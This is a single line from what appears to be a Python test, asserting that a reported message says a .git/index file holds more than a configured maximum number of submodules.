    assert f".git/index holds more than {protection.MAX_GITLINKS:,} submodules" in said
